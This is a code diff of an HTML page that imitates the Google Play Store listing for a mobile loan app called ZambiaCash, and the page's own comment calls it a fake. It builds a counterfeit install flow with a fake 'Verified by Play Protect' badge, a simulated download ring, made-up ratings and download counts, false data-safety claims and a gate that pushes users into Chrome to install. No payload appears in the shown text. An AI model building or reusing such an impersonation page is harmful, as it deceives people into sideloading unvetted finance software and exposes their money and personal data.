@@ -10,25 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <script>
         tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
-                        roboto: ['"Roboto"', 'sans-serif']
-                    },
-                    colors: {
-                        brandBlue: '#1E40AF',
-                        brandLight: '#3B82F6',
-                        brandYellow: '#F59E0B',
-                        playBlue: '#0056D2',
-                        playGreen: '#01875f',
-                    },
-                    boxShadow: {
-                        'soft': '0 10px 40px -10px rgba(0,0,0,0.08)',
-                        'glow': '0 0 20px rgba(59, 130, 246, 0.3)',
-                    }
-                }
-            }
+            theme: { extend: { fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] }, colors: { brandBlue: '#1E40AF', brandLight: '#3B82F6', brandYellow: '#F59E0B', playBlue: '#0056D2', playGreen: '#01875f' }, boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' } } }
         }
     </script>
     <style>
@@ -36,1086 +18,644 @@
         .screen { display: none; flex-direction: column; min-height: 100vh; }
         .screen.active { display: flex; }
         .gradient-bg { background: linear-gradient(135deg, #0F172A 0%, #1E40AF 100%); }
-        .glass-card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
-        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; transition: all 0.2s; background: #F8FAFC; }
-        input:focus { border-color: #3B82F6; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
+        .glass-card { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); }
+        input { width: 100%; padding: 0.85rem 1rem; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; outline: none; font-size: 0.95rem; background: #F8FAFC; }
+        input:focus { border-color: #3B82F6; background: #FFF; }
         .amount-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
-        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30, 64, 175, 0.4); transform: translateY(-2px); }
+        .amount-btn.selected { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); color: white; border-color: transparent; box-shadow: 0 8px 20px -6px rgba(30,64,175,0.4); transform: translateY(-2px); }
         .term-btn { transition: all 0.2s; border: 1.5px solid #E2E8F0; border-radius: 0.85rem; font-weight: 600; color: #475569; background: white; }
-        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; box-shadow: 0 4px 12px rgba(30, 64, 175, 0.3); }
+        .term-btn.selected { background: #1E40AF; color: white; border-color: #1E40AF; }
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .star { color: #FBBF24; }
         .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
         #download-ring { transition: stroke-dashoffset 0.1s linear; }
-        @keyframes toastIn { from { opacity: 0; transform: translate(-50%, 20px); } to { opacity: 1; transform: translate(-50%, 0); } }
-        @keyframes toastOut { from { opacity: 1; transform: translate(-50%, 0); } to { opacity: 0; transform: translate(-50%, 20px); } }
+        @keyframes toastIn { from { opacity: 0; transform: translate(-50%,20px); } to { opacity: 1; transform: translate(-50%,0); } }
+        @keyframes toastOut { from { opacity: 1; transform: translate(-50%,0); } to { opacity: 0; transform: translate(-50%,20px); } }
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
         .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
-        @keyframes fadeInOut { 0% { opacity: 0; } 15% { opacity: 1; } 85% { opacity: 1; } 100% { opacity: 0; } }
+        @keyframes fadeInOut { 0%{opacity:0;} 15%{opacity:1;} 85%{opacity:1;} 100%{opacity:0;} }
         .splash-anim { animation: fadeInOut 1.8s ease-in-out forwards; }
-        .debug-box { background: rgba(15,23,42,0.95); color: #4ade80; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 10px; text-align: left; margin-top: 16px; word-break: break-all; line-height: 1.5; max-height: 180px; overflow-y: auto; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-    <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] leading-snug">
-        Message goes here
+<div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw]">Message</div>
+
+<!-- OFFLINE -->
+<div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <h2 class="text-2xl font-bold text-white mb-2">No Internet Connection</h2>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">ZambiaCash requires an active internet connection.</p>
+    <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl">Retry</button>
+</div>
+
+<!-- BROWSER WARNING -->
+<div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <h2 class="text-2xl font-bold text-white mb-2">Open in Chrome</h2>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto">To install ZambiaCash, open this page in Google Chrome.</p>
+    <button onclick="location.href=location.href" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3">Open in Chrome</button>
+    <button onclick="navigator.clipboard.writeText(location.href)" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700">Copy Link</button>
+</div>
+
+<!-- ============ FULL FAKE PLAY STORE ============ -->
+<div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
+    <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
+        <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+        <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
     </div>
 
-    <!-- OFFLINE GATE -->
-    <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-        <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
-            <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
-        </div>
-        <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
-        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection.</p>
-        <button onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl shadow-lg">Retry</button>
-    </div>
-
-    <!-- BROWSER WARNING -->
-    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-        <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
-            <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-        </div>
-        <h2 class="text-2xl font-bold text-white mb-2 font-sans">Action Required</h2>
-        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">To install ZambiaCash, open this page in Google Chrome.</p>
-        <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3">Open in Chrome</button>
-        <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700">Copy Link</button>
-    </div>
-
-    <!-- ====================================================
-         FAKE PLAY STORE UI - FULL RESTORED
-         ==================================================== -->
-    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
-
-        <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
-            <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
-            <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
-        </div>
-
-        <div class="p-5 max-w-lg mx-auto">
-            <div class="flex gap-4 mb-6">
-                <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
-                    <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10">
-                        <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none" />
-                        <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
-                    </svg>
-                    <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover transition-all duration-300 z-0" alt="ZambiaCash Icon">
-                </div>
-                <div class="flex flex-col justify-center">
-                    <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
-                    <p class="text-playBlue font-semibold text-sm mt-1">ZambiaCash Financial</p>
-                    <p class="text-gray-500 text-xs mt-1">Contains ads</p>
-                </div>
+    <div class="p-5 max-w-lg mx-auto">
+        <div class="flex gap-4 mb-6">
+            <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
+                <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10">
+                    <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none"/>
+                    <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
+                </svg>
+                <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover z-0" alt="ZambiaCash">
             </div>
-
-            <div id="download-text" class="hide mb-4">
-                <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
-                <div class="flex items-center gap-1 mt-1 text-playGreen">
-                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
-                    <span class="text-xs font-semibold">Verified by Play Protect</span>
-                </div>
-            </div>
-
-            <div class="flex gap-2 mb-6" id="pre-install-buttons">
-                <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
-            </div>
-
-            <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
-                <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5; pointer-events:none;">Cancel</button>
-                <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">
-                    <span>Downloading...</span>
-                </button>
-            </div>
-
-            <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
-                <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300 active:scale-95 transition-transform">Uninstall</button>
-                <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Open</button>
-            </div>
-
-            <!-- POST-INSTALL: What's new + Rate this app -->
-            <div id="post-install-content" class="hide">
-                <div class="mb-8 border-t border-gray-100 pt-6">
-                    <div class="flex justify-between items-center mb-2">
-                        <div class="flex items-center gap-2">
-                            <h3 class="font-bold text-xl text-gray-900">What's new</h3>
-                            <div class="w-2.5 h-2.5 rounded-full bg-playBlue"></div>
-                        </div>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    </div>
-                    <p class="text-sm text-gray-500 mb-4">Last updated Aug 31, 2026</p>
-                    <ul class="text-sm text-gray-700 space-y-2 font-medium">
-                        <li>- Fixed bugs</li>
-                        <li>- Performance Improvements</li>
-                    </ul>
-                </div>
-
-                <div class="mb-8 border-t border-gray-100 pt-8">
-                    <h3 class="font-bold text-xl mb-1 text-gray-900">Rate this app</h3>
-                    <p class="text-sm text-gray-500 mb-6">Tell others what you think</p>
-                    <div class="flex justify-between items-center mb-6 px-2" id="rating-stars">
-                        <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer transition-colors duration-200 hover:scale-110" onclick="setRating(1)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer transition-colors duration-200 hover:scale-110" onclick="setRating(2)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer transition-colors duration-200 hover:scale-110" onclick="setRating(3)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer transition-colors duration-200 hover:scale-110" onclick="setRating(4)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                        <svg class="rate-star w-9 h-9 text-gray-300 cursor-pointer transition-colors duration-200 hover:scale-110" onclick="setRating(5)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z"></path></svg>
-                    </div>
-                    <button id="btn-write-review" class="text-playBlue font-semibold text-sm">Write a review</button>
-                </div>
-            </div>
-
-            <!-- PRE-INSTALL CONTENT -->
-            <div id="pre-install-content">
-                <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
-                    <div class="flex-1 flex flex-col items-center">
-                        <div class="flex items-center gap-1">
-                            <span class="font-bold text-base">4.6</span>
-                            <svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
-                        </div>
-                        <span class="text-[11px] text-gray-600 mt-1">3.1K reviews</span>
-                    </div>
-                    <div class="w-px h-10 bg-gray-200"></div>
-                    <div class="flex-1 flex flex-col items-center">
-                        <svg class="w-5 h-5 mb-1 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
-                        <span class="font-bold text-xs">500K+</span>
-                    </div>
-                    <div class="w-px h-10 bg-gray-200"></div>
-                    <div class="flex-1 flex flex-col items-center">
-                        <div class="border border-gray-600 rounded px-1.5 text-[11px] font-bold mb-1">12+</div>
-                        <span class="text-[11px] text-gray-600">Rated for 12+</span>
-                    </div>
-                </div>
-
-                <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
-                    <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
-                        <div>
-                            <p class="text-blue-200 text-[11px] font-bold tracking-widest uppercase">Available Limit</p>
-                            <p class="text-white text-3xl font-extrabold mt-2">Ksh 50,000</p>
-                        </div>
-                        <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20">
-                            <p class="text-white text-sm font-bold">Instant Disbursement</p>
-                            <p class="text-blue-100 text-[11px] mt-1">Straight to M-Pesa</p>
-                        </div>
-                    </div>
-                    <div class="w-44 h-80 bg-white border border-gray-200 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
-                        <div>
-                            <p class="text-gray-400 text-[11px] font-bold tracking-widest uppercase">Interest Rates</p>
-                            <p class="text-brandBlue text-4xl font-extrabold mt-2">10%</p>
-                            <p class="text-gray-500 text-sm font-medium mt-1">Only</p>
-                        </div>
-                        <div class="bg-blue-50 rounded-xl p-4 border border-blue-100">
-                            <p class="text-brandBlue text-sm font-bold">Low Cost</p>
-                            <p class="text-gray-500 text-[11px] mt-1">No hidden fees</p>
-                        </div>
-                    </div>
-                    <div class="w-44 h-80 bg-emerald-500 rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
-                        <div>
-                            <p class="text-emerald-100 text-[11px] font-bold tracking-widest uppercase">Approval Time</p>
-                            <p class="text-white text-4xl font-extrabold mt-2">2 Min</p>
-                        </div>
-                        <div class="bg-white/20 backdrop-blur rounded-xl p-4 border border-white/20">
-                            <p class="text-white text-sm font-bold">Fastest Loans</p>
-                            <p class="text-emerald-50 text-[11px] mt-1">24/7 Available</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="mb-8">
-                    <div class="flex items-center justify-between mb-3">
-                        <h3 class="font-bold text-xl text-gray-900">About this app</h3>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    </div>
-                    <p class="text-sm text-gray-600 leading-relaxed mb-4">
-                        Get instant mobile loans from Ksh 1,000 to Ksh 50,000 directly to your M-Pesa. We offer low interest rates, instant disbursement, and flexible repayment terms of 30 to 90 days. No paperwork, 100% online.
-                    </p>
-                    <div class="flex gap-2">
-                        <span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Finance</span>
-                        <span class="border border-gray-300 rounded-lg px-3 py-1.5 text-xs font-medium text-gray-700">Loans</span>
-                    </div>
-                </div>
-
-                <div class="mb-8 border-t border-gray-100 pt-8">
-                    <div class="flex items-center justify-between mb-3">
-                        <h3 class="font-bold text-xl text-gray-900">Data safety</h3>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    </div>
-                    <p class="text-sm text-gray-600 leading-relaxed mb-4">
-                        Safety starts with understanding how developers collect and share your data. Data privacy and security practices may vary based on your use, region, and age.
-                    </p>
-                    <div class="border border-gray-200 rounded-xl p-5 space-y-5">
-                        <div class="flex items-start gap-4">
-                            <svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"></path></svg>
-                            <div>
-                                <p class="text-sm font-semibold text-gray-900">No data shared with third parties</p>
-                                <p class="text-xs text-gray-500 mt-1">Learn more about how developers declare sharing</p>
-                            </div>
-                        </div>
-                        <div class="flex items-start gap-4">
-                            <svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path></svg>
-                            <div>
-                                <p class="text-sm font-semibold text-gray-900">This app may collect these data types</p>
-                                <p class="text-xs text-gray-500 mt-1">Financial info and App info and performance</p>
-                            </div>
-                        </div>
-                        <div class="flex items-start gap-4">
-                            <svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-                            <div>
-                                <p class="text-sm font-semibold text-gray-900">Data is encrypted in transit</p>
-                            </div>
-                        </div>
-                        <div class="flex items-start gap-4">
-                            <svg class="w-6 h-6 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                            <div>
-                                <p class="text-sm font-semibold text-gray-900">App doesn't provide a way to request data deletion</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="mb-8 border-t border-gray-100 pt-8">
-                    <div class="flex justify-between items-center mb-4">
-                        <h3 class="font-bold text-xl text-gray-900">Sponsored <span class="font-normal text-gray-500 text-sm mx-1">•</span> Suggested for you</h3>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
-                    </div>
-                    <div class="space-y-5">
-                        <div class="flex items-center gap-4">
-                            <div class="w-16 h-16 bg-[#FF6600] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
-                                <span class="font-extrabold text-3xl italic tracking-tighter">K</span>
-                            </div>
-                            <div>
-                                <p class="text-base font-semibold text-gray-900 leading-tight">Kilimall: Online Shopping</p>
-                                <p class="text-xs text-gray-500 mt-1">Shopping • Online marketplace</p>
-                                <div class="flex items-center gap-2 mt-1 text-xs text-gray-500 font-medium">
-                                    <span>4.3 ★</span><span>•</span><span>18 MB</span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="flex items-center gap-4">
-                            <div class="w-16 h-16 bg-[#008800] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
-                                <svg class="w-10 h-10" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 7v10l9 5 9-5V7l-9-5zm0 2.18l6.9 3.83v7.98L12 19.82l-6.9-3.83V8.01L12 4.18zM9 15h2v-3h2v3h2V9H9v6z"/></svg>
-                            </div>
-                            <div>
-                                <p class="text-base font-semibold text-gray-900 leading-tight">SportPesa - Bet & Win</p>
-                                <p class="text-xs text-gray-500 mt-1">Sports • Betting</p>
-                                <div class="flex items-center gap-2 mt-1 text-xs text-gray-500 font-medium">
-                                    <span>4.1 ★</span><span>•</span><span>24 MB</span>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="flex items-center gap-4">
-                            <div class="w-16 h-16 bg-[#34D186] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
-                                <svg class="w-10 h-10" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
-                            </div>
-                            <div>
-                                <p class="text-base font-semibold text-gray-900 leading-tight">Bolt Food - Delivery</p>
-                                <p class="text-xs text-gray-500 mt-1">Food & Drink • Delivery</p>
-                                <div class="flex items-center gap-2 mt-1 text-xs text-gray-500 font-medium">
-                                    <span>4.4 ★</span><span>•</span><span>32 MB</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="border-t border-gray-100 pt-8 mb-8">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-xl text-gray-900">Ratings and reviews</h3>
-                        <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
-                    </div>
-                    <p class="text-xs text-gray-500 mb-5 leading-relaxed">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
-
-                    <div class="flex gap-4 items-center mb-8">
-                        <div class="flex flex-col items-center">
-                            <span class="text-5xl font-light text-gray-900">4.6</span>
-                            <div class="flex text-gray-800 my-1">
